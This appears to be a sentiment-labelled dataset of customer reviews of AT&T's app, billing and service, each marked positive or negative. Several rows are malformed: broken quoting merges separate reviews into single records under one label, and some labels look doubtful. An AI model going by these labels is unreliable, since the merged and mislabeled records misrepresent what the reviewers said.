"Trying to relax on a Friday night and purchased an on demand movie. Very pixelated and pausing, reset internet, reset direct tv receiver. Still did not fix problem. Chat live was unable.",negative
Love it,positive
I have been an AT&T customer for years.  The cost of my cell phone has gone up little by little until it was almost $70 a month.  I called to ask for a cheaper rate due to my fixed income I can no longer afford this rate.  They do not offer senior rates and they said there was nothing they could do.  So I did something...canceled and switched to Spectrum for $15 a month. Sorry AT&T but you lost a good customer.,negative
"Keeps giving a ‘time out’ error. A non-functional mobile app doesn’t reflect well on ATT. Avoid this app, it’s not worth your digital real estate.",negative
"The new app is horrible. I can’t even pay my bill. 
The app takes me to a page trying to sell me a Apple Watch and I cannot get out of that page to go into my account. Not usable for anything. Horrible and unusable.",negative
Slow and to many bugs has a hard time staying loaded and logged in.,negative
"The worse customer service experience I’ve ever had!!!!
People lied to me and they were very rude",negative
I am told my account service is only available from M - S 8:00 am - ... PT. I’m in Europe so that doesn’t work for me especially since I think I’ve been hacked. AT&T is a multi-billion dollar company and there is not a soul working for 24 /7 emergency coverage - really?  My password and PIN code are not recognized and the automated answering service hung up on me - really???,negative
"So I called up one of your company-Direct TV-, I got a quote from them with 3 cell phone line and cable tv for $130.00 monthly charges. I did not authorized to create a service but the representative I spoke with just created. Now ATT ripoff my credit score for they said that I owed something that I never authorized. Why should  I rate this company an outstanding score? Stupid!",negative
"App only works half the time. 
Messages states “my AT&T app is not available, sorry for the inconvenience please try again later ( reslgn0103)",negative
"This app will not give me updated information. It shows I have a combined bill but I only have wireless service. I have called a million times and it has not been corrected yet.  I get  a notice I can upgrade but when I try to upgrade it shows I have to pay the full price for the new phone. 
I have been  a customer for a long time.",negative
The level of decline from this once great company and its offerings are monumental. This app is an example of how far from the mark they have landed. It’s not very intuitive and downright wrong much of the time. Take what it tells you with a grain of salt.,negative
??????,positive
App says it had recent update. But upon reaching the ID screen it does not permit entry of password.,negative
This company has been nothing but a headache for our family. We can’t wait to switch providers. Recently our bill increases $25 because AT&T decided we needed better coverage and upgraded us without asking . I would not recommend to anyone,negative
Over all just a slow running bad app that seems to be more focused on selling products than giving support for the service.,negative
Runs extremely slow. Most of my information is not correct. The people you talk to through the chat give you wrong information.,negative
I’m not the type of person that normally swears but with AT&T I think I’m gonna have to start. every time I sign in to my AT&T account it requires I put in a password denies that is the right password so I have to change my password and then after I do that it says let me send a code to make sure it’s you and I have to do that twice before I can get into the account the most frustrating account app etc. I don’t sign into my account that often so typically it’ll start off with let’s check if you haven’t been into your account a while when even let the face ID work seriously is all the security necessary if somebody wants to pay my bill let them! I repeat extremely frustrating.,negative
"Unable to log into the app because the ‘text confirmation code’ button is frozen. So, I can’t view my AT&T account because the AT&T app doesn’t work on a (new) phone that was purchased from AT&T. Oh, the irony.",negative
It’s not user friendly it just stinks,negative
My bill went up $9 for no reason,negative
I don’t remember changing anything about my bill but yet still it’s always changing. I try to keep one exact payment amount but you guys keep updated my amount to your liking. It’s fine now I see why people keep leaving AT&T for Verizon and other cellphone companies.,negative
"I’m allegedly “in” my account now.  It says “hello, Robert”. Yet not a single option does anything when I press it.  Just says “confirm your password”— it I cannot get to any password screen to enter it!",negative
I started a chat on line to find out why my current bill was more than the previous bill. Person came on I told her the problem and never heard back from her. Terrible service.,negative
I was supposed to be getting a $75 discount on a monthly bill since January. But every month I have to call them and remind them to put in the $75 discount off my bill does it take a rocket scientist to figure this out it’s supposed to be customer satisfaction discount which I’m supposed to get it for 12 months. Question is why don’t they just put it in the system and take care of it like they originally said they were going to do. It turning into being a pain in the neck.,negative
Stop changing format,negative
"It’s near impossible to accomplish anything using this terrible, unbelievably slow app.",negative
The app doesn't let me get past two clicks from the main page and returns me to the user ID home page.,negative
"By my own will, I signed up for wireless, home internet, directv, and digital life home security.

Except for the home security (which thankfully has yet to be tested) every single one of these has been less than mediocre in every aspect.

Extremely weak wireless signal, dropped calls, slow connection, outages, on and on

If it weren’t for the coverage in certain places, I would not stay one more day with AT&T

I am not happy.",negative
Between wireless ATT phone account and Directv account usability is difficult. Many password resets needed because site redirects  when attempting to log in.,negative
"I was an AT&T member since the the days of Cingular wireless, around 2005. Their customer service was great back then and continued being great all the way into about 2015, when it changed completely.  I used to call when I had a question/problem and they’d answer immediately and provide prompt, helpful service. Now, you’ll be on hold extended periods of time and worse, transferred to two or three different people, some who barely speak english, before your problem can be resolved, then you find that whoever you spoke to never resolved your problem at all and you have to call back and go through the whole process again.  Seriously, I was a loyal customer of AT&T for nearly 15 years and always recommended them to friends and family. Now their technology is clunky, they have literally the WORST customer service I’ve ever experienced, and are too expensive for lesser service than other providers.  I just switched to Verizon this year and am much happier. Better signal, better deals, MUCH BETTER customer service and cheaper even with all the accumulated years I had at AT&T! You’d have thought AT&T would have made an attempt to keep me, having been a member so long, but they never even contacted me to see what the problem was or what they could do to keep me as a customer. You’re just a number with AT&T....",negative
the app is not letting me into my account at all and its been a week and i keep trying everything and nothing works,negative
"Most of the time, the app does not recognize my username and password even though they work on the website. If I do manage to log in (I’ve changed my password so many time I have no idea what it is any more and this app does not allow special characters, so can’t let Apple create a password) - anyway, off by some miracle I manage to get it, it shows me info that is over a month old in terms of usage. Nothing makes me want to try Verizon more than this terrible AT&T app.",negative
Website completely geared towards selling more products and services.  Not helpful at all with regard to self service tools!!,negative
Better than any cell service available in our area.  Just wish there weren’t so many dead zones in our area.,positive
The app never works when you need it to work.,negative
"I moved to another apartment , waited to be connected and installed , but nobody install for me , and still charged me for one month , so I just canceled account after one month waiting",negative
It isn’t working on my IPHONE properly! Ugh!!!!,negative
"Att which my unlimited plan to a plan that cost me more money. The representative which it back to the plan I had originally, why would I want to pay more money?",negative
Best service ever!!!,positive
Love the app and the service provided by at&t thanks for the great service!,positive
No matter how many times I try — with right email and password — it locks on the “hold a minute” screen forever and I never get in.,negative
this app is garbage. this company is garbage. complete trash.,negative
My bill increases every month; not happy about that!,negative
Our AT&T store manager told us about several promotions when we got our new phones.  Turns out she was either mistaken or gets a commission.    Her misrepresentation has cost us over $1500.00.    We will not buy from AT&T again.  Customer Service would do nothing to compensate us for her inaccurate sales pitch!,negative
Sorry app for such a big company,negative
I am still holding and hearing a recording that states I can access MyATT app to pay my bill.  It is precisely why I am calling because I cannot access this system.  This is ridiculous.  It took a while to get the rep to understand my issue after which she was glad to get rid of me via a transfer to another dept..  took about 12 minutes to get an answer and now she says she cannot find my account!!  Great!!,negative
Everything this company does now has nothing to do with customer service and everything to do with making money.  What a shame!!!,negative
Gracias por este servicio de pago,positive
I going to pull out ATT for lies !!!!!!!!,negative
Excelente,positive
Always have issues logging in! Everytime!!,negative
"App worked fine until the update. Now everything is screwed up. Contacts, messages & texts are crossing between our phones. Can’t open my account info in app. It just buffers!!!!!!!!!!
??????????????????????
Just updated but still don’t have option of clicking on the billing option I want. Only the current bill due is there. This is not a fix!!!
????",negative
Just to see my balance u have to go thru all kinds of sales pitches,negative
The chat now button crashes the app. Get rid of it.,negative
"This company don’t do nothing but lie back and forth. I have been waiting for my install since June 12th and its now June 20th. I have never in my life experienced such horrible customer services, what terrifies me is that I haven’t even got service started yet and it’s bull crap already. I have copies of every conversation and when I let them know what the previous person said verbatim they say it never was said. I hate I have to give 1 star just to send this !!! 
Not a valued customer at all",negative
"The issue is that the representatives that work for these companies just want to sign people not explain thing in clear English. But instead of explaining they get us in marriage where is you don’t pay you don’t get service. When you tell them or ask is it still the same they say yes to shut you up then make you feel pretty stupid at the end because of the hidden fees and are very real. These companies exist to make money not to make you feel good, that’s how they design it. Sadly today I’m canceling and I was begged to get a AT&T plan and now I regret it so bad. I was so much better off paying 60 dollars for unlimited for everything and minus 10 dollars for auto pay.",negative
The worst customer service. I’ve been told different prices by different reps. The proce they charge you is higher than any price you were told. Leaving for another company. Wish I could give zero stars.,negative
"Nightmare not good service, not bad service no service tried to pay my internet and cable bill on line for 1 month unsuccessfully worthless app",negative
It takes several days to finally access the website now.  Usually it does not even load. Then if it responds it is white screen. Then after a few days and several tries later it loads. The takes another week to 10 days to get on again. I had to call 611 previously to get account balance and payment information. All other apps and sites work except att and Dtv.,negative
Not upset with app.  Just frustrated to learn that I got snookered.  Evidently the plan called unlimited isn’t unlimited,negative
"With 7 phones and a lot of money spent you’d think that AT&T would make sure there app is working. Even with the lasted update, you still can’t track your data usage because they have a technical hiccup on there end....how long will this go on??? I’m disappointed in this app and the company.",negative
"Download the app, sign in and I receive a “Hmm... Looks like something’s not working” message. My first time user perspective? The app is useless.",negative
Still no response,negative
AT&T is throttling internet speeds and streaming the closer you get to the due date for your bill.,negative
"I like AT&T until I go visit my family in the country. I do not have phone service in what seems to be remote areas. WiFi calling works well if I have access to it. Otherwise, I like AT&T. Good job.",positive
My bill is extremely too high compared to other cell phone companies.,negative
"This ap is the worst!  UVerse should take notes from their sister co, Directv, on how to develop a more user friendly experience for their  customers. I am getting the feeling that ATT is about to discontinue UVerse. Getting help is horrible and the ap is no help at all!",negative
"App is not user friendly! So complicated! Just want to see total & due dates!
We enjoyed cable when we had it but unfortunately AT&T laid off we had to get rid of it because of the cost!",negative
"poor service, condescending staff on at&t stores, phone cust.service is worse, misleading promo's!!!",negative
Doesn’t show my data usage,negative
I recently joined the AT&T family along with my daughter.  Since getting AT&T I have spent a told of $979.  I thought Sprint was bad.  AT&T maybe worst!!! I called several times to get on the mobile app and they kept telling me you’ll be up and running in two days.  That was from May 31 today (6/21/29).  I still can’t get my mobile app to open.  It gives me a restriction notice!!! I’m tried of AT&T.  When my contract ends. I’m going to a phone company where I can pay as you go!,negative
App needs to be updated. I always have such a hard time paying a simple bill on here,negative
Left hanging in live chat and no resolution,negative
Can not get into the app to pay my bill!  Very frustrating!  I finally get in and then it says we want to verify you and send a text..... fine but when I select it it won’t advance.... there are double buttons and neither work or advance.  Grrrrrr,negative
"When it works it’s great. When it stops working, there is no way to contact a real person to get your problem resolved. Horrible, horrible customer service model.",negative
I can’t get in to my account. It keeps timing out will not load.,negative
"Only At&t could release an app update meant to fix login issues that actually break the login process all together. Now instead of having to select my account each time instead of Face ID launching it. I get face id, select account, and then log...  nope select account again, then log..... nope select account again?  I get it 3rd times a charm. Select account. Ihhh its spinning its liading and log..... nope select account again!! Wheeee!!!!!  Endless loop of selecting account.....  fix your sh#t AT&T.",negative
Takes significant time to load when it actually opens. Hard to navigate and antiquated appearance.,negative
My Direct tv keeps going in and out. I have not not seen $91.00 worth of TV and they want me to pay my bill.,negative
This app is horrible. Ive had nothing but problems with it since switching to AT&T last fall.,negative
Can’t get anyone to understand one simple question can’t get answers to no questions,negative
In a very long chat Jhoedy C Verified my activation fee for an upgraded phone would be waived.  Now low and behold ATT has denied that this conversation ever took place.  So I have been accused of making up the conversation and the screen shots that I took of phone numbers provided to me during the CHAT.  And made up the name of Jhoedy C.,negative
since the software update on March 21 the widget no longer works. both at&t and apple tried to help but it appears be a software glitch. please fix! rest of app is pretty good. thanks!,negative
This is the wrost site ever you can't get anywhere on this site. I finally located a phone number to call and I get this girl name Taylor from ATLANTA and her solution was to get another cell phone with a hot spot for better internet service. Really Taylor that’s the best you can do. Go figure,negative
Nice to view your bill,positive
"I’ve written 3 times to Live Chat and gotten one response that said system not working. No follow up. No response to the same question asked 3 times. Your reputation continues to be that of an uncaring, incompetent conglomerate. No proof otherwise.",negative
AT&T prices are out of site.  Can’t keep this account much longer when only income is Social Security.  That is sad when people in my situation have very little entertainment other than home TV.  Looking for other sources.,negative
They took 2 hours of my time and resolved nothing! It was on the instant chat- would highly not recommend it!!,negative
"Went in to ATT store and purchased 2 new phones and added 1 line. After some high pressure sales tactics I agreed to add internet service knowing that I would cancel after I left the store. Adding the internet to my account without having it has messed up my access and I no longer can view billing information or other account information!!! Called 611, no help. Called the 800#, no help. Went back to ATT store, no help! Everyone keeps passing me off to someone else but nobody does anything to help...",negative
"This hasn't let me log in since the last update over a month ago. The regular website forces me to enter a code everytime I use it now,so I wonder if the app is simply not compatible with that. In any case, ditch the app and use the website, which has a built-in link in 'Settings-Cellular-Carrier Services'!
Update: Another update two days ago has fixed nothing. It tries to skip the login page, and then won't load.",negative
"The app is slow to load pages. Also it is confusing - I have autopay, but the app has an active button that says “enroll in autopay”. The button should either be greyed out or have a title of “ currently enrolled in autopay”.

Love to have it so easy to access what I need so quickly.,positive
Despite calling about last months bill being wrong It is wrong again this month! I bought a 2nd phone on BOGO plan and you are charging me for the monthly $41.67.  I need a credit for the 1st month $41.67 AND for the current billing $41.67 on the 2nd line #. I should only have a phone charge of $41.67 on the line ending with #0778.,negative
Makes paying my bill much quicker and easier. Can also schedule late or split payments with ease.,positive
"Don’t even bother downloading if you are an AT&T prepaid customer, all the app does is kick you out to Safari. You’re better off just accessing the website from your browser of choice. What the hell is the point of an app that only caters to postpaid customers? If this ever changes I’ll update my rating and review, but considering how little this company seems to care about its customers, I doubt that will ever happen.",negative
I keep trying to login it recognizes my face ID but then it says I need to enter my password but nowhere does it give me the option of entering my password and the part that says sign in is grayed out and when I hit it nothing happens. Annoying,negative

I am going to stop updating my app because it’s way too much of a pain. 
What’s the point of saving the password if you can’t really save it?",negative
"Why did you bother making an app when it never connects?  On AT&T Wi-Fi it either spins or tells me my data usage is “temporarily “ unavailable. Why do you call it unlimited when it’s throttled, restricted, and limited?  The AT&T unlimited data plan is not unlimited. I wish I could make you feel as miserable as the service you provide.",negative
"1)I became a customer approx Mar 29, 2019 and requested a auto pay for the first day of ea month. Each month I tried to get this changed through a customer Svc rep only to get charged a$9.25 late fee

3) Finally, my cell phone acts like a “party line”. I can hear other people talking during my conversation.
No luck in getting anything changed by having these conversations with a service rep",negative
Horrible even with the correct user name and password I can not access my account. And there is no tech support to call to boot.,negative
Nothing is ever right! I always have to call them to come fix something for their mistake and they try charging me for it,negative
Awesome and so easy to understand and use,positive
What happened to spliting the bill up to pay??,negative
Since getting the latest and greatest phones my bills have gotten higher and the phone performance is awful. I now need to put a land line BACK in my house in order to make a phone call. The phones work fine in town but at home we cannot receive incoming calls and when calling out most calls are lost.,negative
How do I access Directv account now? It says I can do it at the myAT&T app but I don’t see it. Very poor communication on this transition.,negative
On phone for 30 mins trying to cancel service and “something wrong with system” so they couldn’t do it. For my troubles they said they would give me a $75.00 credit. I just looked and all I recurved was a $35.00 credit. This company has gone down hill. Have been a loyal directv customer for over a decade and this is how they treat me. Will be switching to dish.,negative
The first representative was very helpful with the information but as I was transferred to the loyalty department representative was not at all much help especially after explaining to her the situation I’m in it was no help! It actually just stresses me out more. I was really expecting to help some real loyalty assistance after being with at & t for so long in this moment of financial hardship.,negative
"Yesterday I spoke with a representative, her name was Jennie Prez (I think) that’s close. It was on item 1-245366851127R2. She was absolutely amazing, the best customer rep I spoken to in a while. I’m not only saying that because she got my monthly payment down but because she was very good at her job and very friendly too!",positive
"It seems some intern has design the entire mobile app. Workflow is designed badly. Why do I want to see alerts if I am checking my order status.
Again it takes 45 seconds or more to see the order status.

Great service.,positive

I was hoping it was a glitch that they would resolve but after 3 weeks there is NO excuse.

Par for the course.  If you can’t get help...confuse the hell out of the customer.
And it says I may have bought a new phone!  Didn’t do that either...at least I don’t think I did!",negative
Won’t update. Keeps showing old data. Freezes when I touch most of the options. Supposedly was fixed with the last update. Doesn’t look like it.,negative
Jasmine is a quality representative. Thanks again Jasmine,positive
AT&T changed data usage chart to MB when they charge for gigs . No customer service over the phone . Can’t get a simple quote for prepaid service. Verizon was willing to communicate verbally about phone service details.,negative
Nothing great about this app.  Could not even send reminders when bill is due,negative
Won’t ever update acct info..  A phone company can’t even make a halfway usable app to pay my bill? Comical...,negative
Tried to upgrade my phone after updating the app and it won’t even work,negative
This App has been glitching a lot more lately. When I log in to pay my bill it kicks me out or won’t load at all. It’s frustrating & then I end up having to call the 611 number. App used to work better.,negative
"The app is unstable in signing in, the programming for Direct TV is b coming horrible. Looking to switch companies.",negative
Update after update & usage widget still not working. How hard is it just fix the problem already! Fix it!,negative
"This app worked perfectly for the longest time. Then suddenly it just stopped working. It’s not a password issue.  I get a generic “the app is experiencing technical difficulties” blah blah blah error message. I’ve gotten this message for over a MONTH. I called AT&T and spoke with their IT/ customer service.  They confirmed that it wasn’t anything I was doing wrong and IT was aware that there were problems with the app.  It is frustrating beyond belief since this was my primary and most convenient way to pay my At&t bill. I finally just deleted the darn thing today. I guess I’ll have to call AT&T to pay my bill.  I hate this. I also hate that when you call the automated message reminds you that you can pay online. ?? I’d give this app zero stars if I could.  Maybe it will magically work for you, but it does absolutely nothing for me.",negative
"I can login with no problems but as soon as I click my telephone number, the app stops dead in its tracks. Nothing. Zero. Zip. Zilch. Nada. It just engages in a staring contest that I’m doomed to lose. (And before you ask, yes, I’ve deleted and downloaded this ridiculous app 6-7 times with the exact same result.)

I have now resorted to just paying my account on my laptop, instead, every time.",negative
They are helpful,positive
I took 1 min to pay my bills. Love ATT,positive
"Even though i installed the application, all of my thoughts of managing my prepaid account through the app totally went astray, when i found that as soon as i try to login, this app redirects me to a web page instead. This is hilarious given this age of apps for every thing under the sun. I’m sorry that I cannot give anything more than 1 star from the functionality perspective, since this does even serve the basic purpose for me. 

I would like to see an update where you add support for prepaid and i hope to give you a 5 star then.",negative
Too much going on not at all user friendly. Make wish I stayed with  T-Mobile,negative
"This app has always been slow, but I appreciated how easy it was to check for upgrades or get travel data plans. Now the app doesn’t even load. This is extremely inconvenient and I hope it gets fixed soon.",negative
Many times in the past u promised to make changes to my account...... With these changes never going into effect..... Your customer service is horrible,negative
Can never get the invoice to load.,negative
"I have a different AT&T app that shows incoming calls only so I can block certain incoming calls. That app shows up to the second result of calls coming into the phone. Many times I find that those incoming calls are not registered ever on this app. So it can be confusing. Also this app can be many, many hours behind real time. But it’s good for a general knowledge of the calls coming in and going out if complete accuracy is not important.",negative
Bad service,negative
I’ve spent too much time trying to get the autopay credit set up. I feel I’ve gotten the run around. And seriously doubt I was even speaking with someone in the US. I’m an educated person and don’t like being talked to in a manner which is somewhat demeaning. It should not take over 2 months to get the auto pay credit in my bill.,negative
"So theoretically one would get a discount for having at&t phones and direct tv.
Service listed in two addresses, so I have two bills and no discount.",negative
Every time I try to log in it says there’s a code being sent to my phone and the “send code” button does not work. So the app is useless. And they add unnecessary hidden charges to my phone bill every month. Do not trust this service.,negative
"When using the “chat” function you initially get a machine this is surprising but after I give information to this machine I need to repeat the info to the agent. 
The app is fine if you just want to pay the bill but I’d suggest you call or go in person to get helpful meaningful assistance. Also it costs AT&T more per minute that way. 
Get your money’s worth.",negative
"Every time I try to sign into my account I have to creat a new password. Also I changed my last name on my account years ago and it seems that sometimes it’s fine,but if I log out and want to log in again I’m not recognized. I rid myself of direct tv because of all the problems and now am thinking of changing my phone service,after over 25 years. Att has really dropped the ball.
Also overcharging,making really stupid excuses,talking to customers service people that don’t have a clue have made me so frustrated with ATT that I have literally screamed.",negative
I can’t tell you how many times I try to pay my bill and the app won’t even load. At one point it was great..now I can’t wait this leave this company. I mean the app is bad. This company is 25 times worse.,negative

"I got a letter in the mail from AT&T about 2 months ago stating someone was trying to access my account through the AT&T mobile app. and for security purposes they had frozen my account. The letter stated I had to go into the app. and change my password. I did that then it stated for additional security it was going to send me a text or email with a passcode to enter. When I attempted to push the send prompt it did nothing. After deleting the app. then reinstalling several times it did the same thing. I spent about 2 hours during several calls to straighten this out without success. Customer service shows no record of a letter being sent or any block on my account. Unless the scammers are getting more sophisticated, got a hold of the AT&T wireless mailing list and are sending out fake letters then AT&T has some unresolved issues. As of this morning I am having the same issue. Can’t order a new phone, can’t pay my bill, can’t check my minutes or any other in-app. application. Anyway, I am on a family plan. Due to poor coverage in our area and the number of dropped calls they all want me to change providers. I have been with AT&T for maybe 20 years now. I think they are right and it’s time to change.",negative
"Super user friendly app!
I can manage my account so easily with no hassle, or calling anyone.",positive
This isn’t a real iOS app. It behaves like a mobile website being pushed through a limited web browser instead of being a full featured dedicated iOS app. There’s no excuse for it.,negative
AT&T lies just to get your money.,negative
"Not sure why you change the I/O… Seems like you took a step backwards. Can no longer set the payment amount, can’t set the payment date everything seems to be automatic…",negative
"I’ve been an AT&T customer for 19 years. I have extremely poor service in the area that I live, as well as other neighbors who complain about the same thing. I’ve called and complained several times and nothing has ever changed. Several in our community have done the same. I went on vacation a couple of weeks ago and went to a show, and they asked to see a phone from the audience. Someone handed them the phone. It was an AT&T customer and the person couldn’t get service. So the host had to ask if anyone had a Verizon phone. That’s the moment my husband and I made the decision that once we get out of contract with AT&T we will be switching to Verizon! We’ll give them the next 19 years and see if they value us more than AT&T has. Thanks for making me your most unvalued customer. I know exactly where my concerns stand in your book!",negative
"Service is not working properly on all the phones on my plan , I have unlimited data ! It could be the beginning of the cycle or end it doesn’t matter and the service is terrible never had this problem before also phone calls won’t go through!!!!!",negative
Well at least you ALMOST restored competence.  Pretty pathetic you STILL can’t manage to make the widget update without opening the app.  Please tell me what is the point?  Why would we need a widget if we have to open the stupid app in order to get it to update?  What planet were you morons born on?,negative
4 times I’ve called the Service Department and asked for help because callers got the message that my mailbox was full. Every time I was informed that the problem was totally resolved. Of course a month has passed and the problem is not fixed. It may be time to switch providers.,negative
When you call for help. You can’t understand the people you talk to. I have three separate accounts and I can’t connect them. I need 3 separate user ids and 3 separate passwords. Who has time for that?? My husband put me on all the accounts to handle while he’s at work they took me off of all of them and never informed us.,negative
The app is still horrible with the newest update. Sign in page won’t let me log in. I have told many of my friends that DIRECTV’s services have been horrible ever since AT&T combined with them. The app and service is getting worse with every passing day of the merger. Can’t wait until my contract is over!,negative
Haven’t been able to login in months...this app never works.,negative
Really slow app. Has been working the same for the past few years. No improvement at all.,negative
The layout makes sense to me; I enjoyed being able to see when my bills are due and how much they are. The app works perfectly with VoiceOver.,positive
It seems my billing changes every month. Somehow my plan go changed to include something called “hotspot”. I never requested such change.,negative
The updates are a good thing for older adults. I love it,positive
The UI for the ATT app is terrible. I just came back to inverse after about 2-3 years and I liked how the old app looked and functioned a lot better,negative
Since March I’ve been fighting with AT&T over my bill! I have to call in every 2 weeks and argue with someone over my bill being incorrect. Each time I call there’s no record or information of my previous call! It’s ridiculous! I’ve been a DirectTv subscriber for 20+ years and have never had this many problems!,negative
"Over charging, no billing information, nasty customer service, unavailable website. I’m out.",negative

No matter what I do. I follow the questions. Can’t get into this app.    Says it conflicts with direct tv sign in.  It has totally different set up.   What’s wrong???????,negative
"When I get ATT App updates on my iPhone, I cannot login with Touch ID.  The settings stay Touch ID and Save password but the login info is gone.  Kind of tiring to update the Login with frequent updates.  The new ATT is not the reliable old ATT.

BTW, I had to give up on DTVN, too.  Every day, usually more than once a day, the channel I was watching was dropped, or the channel wouldn’t load, or some other strange problem.  Maybe this product was rushed to market, in any event, it was far from reliable.",negative
"Upgraded 1 phone and added a new line.  I was told no upgrade nor activation fees would apply, because of inconveniences on delivery, but after calling and visiting a store they were not willing to credit back one of the fees.",negative
"Despite the fact that I pay this bill I always have to involve my husbands since att considers him the primary account holder.  I have been on auto pay for years now but now am getting funny emails.  Last month, I got one before payment day and when I gave her the bank number I had been using for several years, she said that she could not get that number to work.  I gave her my credit card number after she assured 
me that my benefits would not be changed. This month, I got an email that said that all benefits would be cancelled unless I contacted att.  Again, for the second month, I could not get in.  I am an equal member of this household except where att is concerned.  I can close the account without having my husband, while at work, have to spend his whole day on this.  I, on the other hand, am retired, and can spend time on the 
telephone getting this sorted out.  We also have Direct TV so I know we have benefits. Now my att says that I enrolled in auto pay last month.  I enrolled in auto pay years ago.  The bank says there is no reason the payment did not go through.  I feel that something fishy is going here.  Stop these emails if they are not accurate.",negative
"It is really absurd that ATT is discriminating its prepaid users by showing them different UI. 

And also ridiculous that your monthly balance is forfeited automatically even you’re using a plan to pay only per usage.",negative
"In the last version, all of the links on the Contact Us page are non-responsive. Just updated. Same problem! Ironic that I can’t contact them to tell them about the problem. Ha! Classic gross negligence.",negative
This app never works it always has error messages when I try to check my usage or pay my bill,negative
"I can’t get ANY of the parts of the app to work. I nearly had a late fee because my ap says my balance is 0, but I had not yet paid for the month. Also can’t reach anybody to change my service.",negative
This app is not reliable. So many bugs and it has bad info. It needs a complete overhaul,negative
"I am disgusted with my service. I have been dealing with a problem since February.  I have a call log recorded from then which includes over 20 calls made to att that are over one hour each.  Each time I am promised something will be done and yet it never is. I am passed around from customer service reps to loyalty department to Mngr’s etc and yet nothing gets resolved.
I returned a phone back I. March that I was lied to about and all I want is my credit ..my account fixed. I have over paid for the last 4 months so my phone doesn’t get shut off and I just now received another bill that is even higher than all the rest.
I plan on filing a lawsuit for the total stess and loss of work hours over this.

"I just started recently with AT&T after many many years with Comcast, Time Warner and Spectrum. I got frustrated with Spectrum do I made the switch and while there are many good things, there’s still a few things not going so well. I still don’t have access to ON Demand, and the billing is all messed up. Plus we had to down grade from being able to use 8 TVs to only being able to use 4 TVs but I love that all our TVs now have guides and all have DVR access. We also have music channels on all our TVs. 
I’ll just have to give it time to work out the kinks.",negative
Anything you do in this app is very slow. “We’re almost there” endlessly displayed page after page.,negative

Att is really expensive. I pay way less with 5 t mobile phones. I pay t mobile 205 for 5 phones and 3 of the phones have installment payments. I only have one phone with att phone and it cost me 138 for the phone and installment payment. I have had a lot of problems with att over the last two years. I could go on and on. I have better service and less call drops with t mobile. My calls hardly ever drop now. Mainly when I am on the phone with att or directv which is part of the att family. I couldn’t get service in my house or at my church with att and both are in town not out in the country.,negative
ATT makes no effort to provide a decent app that enhances the customer experience.  Bugs and unintuitive.,negative
I want to pay my bill that I got in the mail but I don’t see it on my app how to do that.,negative

I’m tired of my bill always climbing.,negative
"One of the worst apps AT&T has had!  Difficult to navigate because hyperlinks are so unclear as to what they are for and then trying to go back to start over is frustrating because you go back and it takes you somewhere else.

I would love to just open the app and look at what I need too.

The rep. could not explain why this was happening and could only offer me a more expensive data plan. 

I am in AT&T retired employee and it pains me to give my old company this type of rating but when you sacrifice QUALITY customer service suffers.

This app is absolute garbage. Every time I go to use the app it logged me out.  Then when I try to login it says my email and password are incorrect and makes me reset it every single time.  I would recommend choosing any other company besides AT&T. If I could give it zero stars I would.,negative
Unfortunately they lied to us when we moved telling us that our cell phone bill was going to be like $230 a month including Direct TV in our plan. This was almost 2 years ago but the reality is ALOT more then what I want to spend a month... They are NOT any honest company and unfortunately I can do anything until my contacts is completed in November 2019.. ??,negative

"I have several phone calls to billing Dept and I’m growing increasingly frustrated with AT&T since my installation on May 30.  

The billing did not reflect the agreement made with the sales person after several calls I thought this was resolved and a supervisor told me that the agreement finally reflected what I had recorded with the salesman. Believing it was resolved I followed up and discovered the app still was saying My bill would be $150 each month. I called again. Again I was assured that my bill would be the agreed-upon total of $129 which did include taxes and fees. However the app still read $150.

Just discovered that the bill is still not reflective of agreement. 

I’ve been searching the app to determine how to find the shipping / tracking information on A new receiver. One DVR that was included in my service was determined to be defective by the tech department and I was sent information I would receive that DVR yesterday, June 18.  The DVR stopped working within two weeks of installation.

I could not be home yesterday and a neighbor came to my house multiple times to see if the box had been dropped off or any notes left at the front door. She said it did not arrive and when I got home at nine I looked around the front porch to see if had a been set aside and neither of us could locate it.

At this point, I’m still Taking a great deal of time to determine how to contact anyone as to where this DVR is located, especially given the fact that I’ve already been warned I must return the old one within a certain amount of days or I will be charged.

Not to mention after the whole entire experience and me having to return a phone I am stuck with getting told that I will not be charged the full amount of a phone that I don’t even have nor does it work.so when you ask how my experience is this isn’t even space to explain the pain and inconvenience this company as a whole had caused me!

I know that all 3 of our phones are eligible for upgrades, but 20 minutes of trying to get more info about it has been utterly futile. I keep getting redirected back to “DON’T-WORRY-SPEND-MONEY.” This is completely deliberate, of course: AT&T has no interest in you the consumer, only your dough.",negative
"When I purchased the X phone I was told I could get the right free. When I said ok then I was told i needed to add another line and I stated why would I do that since I have 5 devices I could add and I’m not using all 5. I was then told I could cancel the new line after 3 months. When I could out how much I had to pay for the line after not using the phone for a year I decided to cancel and was told I couldn’t or I would have to pay a penalty. From the first week the X started messing up. I couldn’t get the magnifying features to come off the screen. Took it in and there solutions was to power down and not use that feature any more. I hadn’t use it anyway.  The touch screen would stall not work so I powered it down again.  Then when watching the  weather the phone would power down by itself and come back on. Didn’t think much if it until it started happening more often and I call 611 was transferred to someone from apple support and was told to take the phone in while my warranty was still good. I didn’t like the thought of going back to apple store so I waited a few weeks. Went on vacation and the phone went out powering down and would not come back on. It was flashing late at night because I had it plugged in hoping it would charge and come back on. At the time I didn’t know the phone was dialing 911 on its own.  It fail late one night and I could hear the 911 operator but the phone was black. I went to the apple store to have it fixed with my warranty but was told I needed to pay 300$ to get the glass fixed because I caused the crack. While sitting outside by the pool underneath an umbrella my phone started to get hot so I decided to get up and the heat from the phone surprised me and I drop it face down on the table. I got a small crack on the face. That’s how I caused the crack. I was then told I would need to pay another 400$ for data transfer, so I thought I’ve heard enough and left. Well the phone continued to fail 911 without my knowledge and the police showed up at my house at 5AM wanting to know why I keep calling 911 and not talk. I told them it was my phone going crazy and no one would help me with the problem. I stopped charging the phone   I’m a supervisor and the number connected to that phone I’ve had over 20 years and now my family, relatives , employees, all had to be given the second phone the 8 number that I wasn’t using. Now I’m forced to keep the line and none of my calls for the other phone number transfers. I chose a payment plan and now I’m paying for a phone that doesn’t work. After being with ATT for many years I’m about to change all phones/ devices and have all friends and family do the same. Thus is not a company I want to be part of that deals with customers this way. I’m very disappointed in the service and the length/ lies the employees will go to in order to get paid or make a sell .",negative
All my apps seem to work just fine but my ATT app takes forever to load and even times out in many places when in the app. Our internet has slowly declined and as much as I hate Comcast we are reconsidering making the change as we have to call several times a year now to have someone come out and determine that an ATT employee has done something in the main box located a mile away.

